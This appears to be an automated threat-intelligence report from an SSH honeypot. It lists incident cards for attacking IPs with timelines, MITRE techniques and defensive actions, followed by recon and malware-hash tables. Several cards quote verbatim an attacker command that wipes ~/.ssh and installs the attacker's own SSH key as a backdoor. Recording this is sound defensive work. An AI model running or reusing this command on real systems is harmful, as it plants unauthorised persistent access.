| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:15:30` | `cowrie.session.connect` |
| `2026-06-11 20:15:30` | `cowrie.client.version` |
| `2026-06-11 20:15:30` | `cowrie.client.kex` |
| `2026-06-11 20:15:31` | `cowrie.login.success` |
| `2026-06-11 20:15:31` | `cowrie.session.params` |
| `2026-06-11 20:15:31` | `cowrie.command.input` |
| `2026-06-11 20:15:31` | `cowrie.command.failed` |
| `2026-06-11 20:15:31` | `cowrie.log.closed` |
| `2026-06-11 20:15:32` | `cowrie.session.params` |
| `2026-06-11 20:15:32` | `cowrie.command.input` |
| `2026-06-11 20:15:32` | `cowrie.session.file_download` |
| `2026-06-11 20:15:32` | `cowrie.log.closed` |
| `2026-06-11 20:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97be0390901a

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:15 |
| **Last Seen** | 2026-06-11 20:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:15:34` | `cowrie.session.connect` |
| `2026-06-11 20:15:34` | `cowrie.client.version` |
| `2026-06-11 20:15:34` | `cowrie.client.kex` |
| `2026-06-11 20:15:35` | `cowrie.login.success` |
| `2026-06-11 20:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b3182f7c32

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:18 |
| **Last Seen** | 2026-06-11 20:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:18:18` | `cowrie.session.connect` |
| `2026-06-11 20:18:18` | `cowrie.client.version` |
| `2026-06-11 20:18:18` | `cowrie.client.kex` |
| `2026-06-11 20:18:19` | `cowrie.login.success` |
| `2026-06-11 20:18:19` | `cowrie.session.params` |
| `2026-06-11 20:18:19` | `cowrie.command.input` |
| `2026-06-11 20:18:19` | `cowrie.command.failed` |
| `2026-06-11 20:18:20` | `cowrie.log.closed` |
| `2026-06-11 20:18:20` | `cowrie.session.params` |
| `2026-06-11 20:18:20` | `cowrie.command.input` |
| `2026-06-11 20:18:20` | `cowrie.session.file_download` |
| `2026-06-11 20:18:20` | `cowrie.log.closed` |
| `2026-06-11 20:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93de357eef95

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:18 |
| **Last Seen** | 2026-06-11 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:18:22` | `cowrie.session.connect` |
| `2026-06-11 20:18:22` | `cowrie.client.version` |
| `2026-06-11 20:18:22` | `cowrie.client.kex` |
| `2026-06-11 20:18:23` | `cowrie.login.success` |
| `2026-06-11 20:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3113d31b2092

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:22 |
| **Last Seen** | 2026-06-11 20:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:22:05` | `cowrie.session.connect` |
| `2026-06-11 20:22:05` | `cowrie.client.version` |
| `2026-06-11 20:22:05` | `cowrie.client.kex` |
| `2026-06-11 20:22:05` | `cowrie.login.success` |
| `2026-06-11 20:22:06` | `cowrie.session.params` |
| `2026-06-11 20:22:06` | `cowrie.command.input` |
| `2026-06-11 20:22:06` | `cowrie.command.failed` |
| `2026-06-11 20:22:06` | `cowrie.log.closed` |
| `2026-06-11 20:22:06` | `cowrie.session.params` |
| `2026-06-11 20:22:06` | `cowrie.command.input` |
| `2026-06-11 20:22:06` | `cowrie.session.file_download` |
| `2026-06-11 20:22:06` | `cowrie.log.closed` |
| `2026-06-11 20:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86254e2452c1

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:22 |
| **Last Seen** | 2026-06-11 20:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:22:09` | `cowrie.session.connect` |
| `2026-06-11 20:22:09` | `cowrie.client.version` |
| `2026-06-11 20:22:09` | `cowrie.client.kex` |
| `2026-06-11 20:22:09` | `cowrie.login.success` |
| `2026-06-11 20:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba928c7c2dc0

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:22 |
| **Last Seen** | 2026-06-11 20:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:22:57` | `cowrie.session.connect` |
| `2026-06-11 20:22:57` | `cowrie.client.version` |
| `2026-06-11 20:22:57` | `cowrie.client.kex` |
| `2026-06-11 20:22:58` | `cowrie.login.success` |
| `2026-06-11 20:22:59` | `cowrie.session.params` |
| `2026-06-11 20:22:59` | `cowrie.command.input` |
| `2026-06-11 20:22:59` | `cowrie.command.failed` |
| `2026-06-11 20:23:00` | `cowrie.log.closed` |
| `2026-06-11 20:23:00` | `cowrie.session.params` |
| `2026-06-11 20:23:00` | `cowrie.command.input` |
| `2026-06-11 20:23:01` | `cowrie.session.file_download` |
| `2026-06-11 20:23:01` | `cowrie.log.closed` |
| `2026-06-11 20:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3121a5dba5

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:23 |
| **Last Seen** | 2026-06-11 20:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:23:04` | `cowrie.session.connect` |
| `2026-06-11 20:23:04` | `cowrie.client.version` |
| `2026-06-11 20:23:05` | `cowrie.client.kex` |
| `2026-06-11 20:23:06` | `cowrie.login.success` |
| `2026-06-11 20:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367a0ed73b7f

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:25 |
| **Last Seen** | 2026-06-11 20:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:25:06` | `cowrie.session.connect` |
| `2026-06-11 20:25:06` | `cowrie.client.version` |
| `2026-06-11 20:25:06` | `cowrie.client.kex` |
| `2026-06-11 20:25:07` | `cowrie.login.success` |
| `2026-06-11 20:25:08` | `cowrie.session.params` |
| `2026-06-11 20:25:08` | `cowrie.command.input` |
| `2026-06-11 20:25:08` | `cowrie.command.failed` |
| `2026-06-11 20:25:09` | `cowrie.log.closed` |
| `2026-06-11 20:25:09` | `cowrie.session.params` |
| `2026-06-11 20:25:09` | `cowrie.command.input` |
| `2026-06-11 20:25:09` | `cowrie.session.file_download` |
| `2026-06-11 20:25:09` | `cowrie.log.closed` |
| `2026-06-11 20:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db475d73cada

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:25 |
| **Last Seen** | 2026-06-11 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:25:13` | `cowrie.session.connect` |
| `2026-06-11 20:25:13` | `cowrie.client.version` |
| `2026-06-11 20:25:13` | `cowrie.client.kex` |
| `2026-06-11 20:25:15` | `cowrie.login.success` |
| `2026-06-11 20:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.190.211[.]57` | **30** | 2026-06-11 18:06 | 2026-06-11 18:54 | 28m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.36.126[.]68` | **30** | 2026-06-11 19:31 | 2026-06-11 19:49 | 30m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `69.74.29[.]21` | **30** | 2026-06-11 18:26 | 2026-06-11 19:30 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.96.159[.]237` | **29** | 2026-06-11 19:07 | 2026-06-11 19:27 | 37m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `170.80.65[.]140` | **24** | 2026-06-11 19:26 | 2026-06-11 20:25 | 1m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.120.171[.]95` | **21** | 2026-06-11 19:53 | 2026-06-11 20:25 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.229.125[.]106` | **20** | 2026-06-11 16:42 | 2026-06-11 17:22 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.6[.]75` | **20** | 2026-06-11 17:23 | 2026-06-11 18:00 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **15** | 2026-06-11 18:30 | 2026-06-11 20:16 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `165.154.1[.]18` | **3** | 2026-06-11 17:45 | 2026-06-11 17:53 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `41.93.28[.]23` | **3** | 2026-06-11 19:31 | 2026-06-11 19:42 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `43.245.249[.]251` | **3** | 2026-06-11 18:28 | 2026-06-11 18:38 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `114.55.137[.]231` | **2** | 2026-06-11 18:20 | 2026-06-11 18:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.153.190[.]105` | 1 | 2026-06-11 17:43 | 2026-06-11 17:44 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.93.37[.]178` | 1 | 2026-06-11 18:59 | 2026-06-11 18:59 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.240.29[.]98` | 1 | 2026-06-11 16:09 | 2026-06-11 16:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.120.115[.]152` | 1 | 2026-06-11 16:17 | 2026-06-11 16:17 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-06-11 19:33 | 2026-06-11 19:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.158[.]238` | 1 | 2026-06-11 19:28 | 2026-06-11 19:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.240.95[.]27` | 1 | 2026-06-11 19:12 | 2026-06-11 19:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.179.93[.]147` | 1 | 2026-06-11 20:09 | 2026-06-11 20:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.168.194[.]41` | 1 | 2026-06-11 20:10 | 2026-06-11 20:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `135.119.239[.]34` | 1 | 2026-06-11 20:26 | 2026-06-11 20:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]218` | 1 | 2026-06-11 19:19 | 2026-06-11 19:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]124` | 1 | 2026-06-11 19:42 | 2026-06-11 19:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.170[.]54` | 1 | 2026-06-11 19:22 | 2026-06-11 19:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `143.110.178[.]27` | 1 | 2026-06-11 16:11 | 2026-06-11 16:12 | 46s | 0 | `T1592` | 🟢 LOW |
| `155.4.245[.]222` | 1 | 2026-06-11 17:38 | 2026-06-11 17:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.166.94[.]133` | 1 | 2026-06-11 17:56 | 2026-06-11 17:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.179[.]201` | 1 | 2026-06-11 19:51 | 2026-06-11 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.223.60[.]209` | 1 | 2026-06-11 19:15 | 2026-06-11 19:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `191.36.152[.]28` | 1 | 2026-06-11 19:38 | 2026-06-11 19:39 | 31s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.97.69[.]110` | 1 | 2026-06-11 19:29 | 2026-06-11 19:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-06-11 19:21 | 2026-06-11 19:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.64.211[.]93` | 1 | 2026-06-11 19:39 | 2026-06-11 19:39 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]141` | 1 | 2026-06-11 16:44 | 2026-06-11 16:45 | 15s | 0 | `T1592` | 🟢 LOW |
| `93.4.16[.]74` | 1 | 2026-06-11 18:01 | 2026-06-11 18:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
